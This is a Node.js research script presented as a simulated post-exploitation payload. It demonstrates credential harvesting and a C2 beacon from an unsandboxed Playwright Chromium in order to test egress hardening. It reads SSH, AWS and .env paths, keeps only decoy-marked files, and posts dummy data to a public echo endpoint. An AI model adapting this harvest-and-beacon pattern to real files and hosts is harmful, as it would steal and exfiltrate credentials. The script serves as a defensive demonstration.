// SIMULATED POST-EXPLOITATION PAYLOAD — research artifact.
// Represents what native code would do AFTER a renderer memory-corruption bug
// fires in an unsandboxed Playwright Chromium: credential harvesting + C2 beacon.
//
// Safety rails (hard requirements for this demo):
//   - reads ONLY decoy files planted by the workflow (clearly fake values)
//   - exfiltrates ONLY dummy data to a public echo endpoint
//   - never reads real environment variables, tokens, or user files
const fs = require('node:fs');
const https = require('node:https');
const os = require('node:os');
const path = require('node:path');

const BEACON_URL = 'https://postman-echo.com/post'; // public echo service = stand-in C2
const DECOY_TARGETS = [
  path.join(os.homedir(), '.ssh', 'id_rsa'),
  path.join(os.homedir(), '.aws', 'credentials'),
  path.join(process.cwd(), '.env'),
];

console.log('[payload] running as uid=' + process.getuid() + ' pid=' + process.pid);

// A real unsandboxed renderer exploit lands native code with no seccomp
// filter; show this process is in the same position.
try {
  const statusText = fs.readFileSync('/proc/self/status', 'utf8');
  const seccompLine = statusText.match(/^Seccomp:\s*(\d+)$/m);
  console.log('[payload] own seccomp mode:', seccompLine ? seccompLine[1] : 'unknown',
    '(0 = unfiltered, i.e. same privilege position as an unsandboxed renderer)');
} catch {}

let harvested = 0;
for (const file of DECOY_TARGETS) {
  try {
    const data = fs.readFileSync(file, 'utf8');
    // Report ONLY planted decoys (marker string), never real credentials —
    // keeps the demo safe on developer machines too.
    if (data.includes('RESEARCH')) {
      harvested += 1;
      console.log('[payload] CREDENTIAL ACCESS OK (decoy):', file, '(' + data.length + ' bytes)');
    } else {
      console.log('[payload] real file present but not a decoy — skipped:', file);
    }
  } catch {
    console.log('[payload] miss:', file);
  }
}

// C2 beacon with DUMMY content. If harden-runner egress-policy blocks this,
// the request errors and we report containment instead.
const body = JSON.stringify({
  host: 'RESEARCH-DEMO',
  creds: harvested,
  key: 'FAKE-DEMO-VALUE-NOT-A-REAL-SECRET',
});
module.exports = new Promise((resolve) => {
  const req = https.request(
    BEACON_URL,
    { method: 'POST', headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) }, timeout: 15000 },
    (res) => {
      res.resume();
      res.on('end', () => {
        console.log('[payload] C2 BEACON SUCCEEDED — exfil channel open, status=' + res.statusCode);
        resolve();
      });
    }
  );
  req.on('timeout', () => { console.log('[payload] C2 beacon timed out'); req.destroy(); });
  req.on('error', (err) => {
    console.log('[payload] C2 BEACON FAILED (' + err.message + ') — egress contained?');
    resolve();
  });
  req.end(body);
});
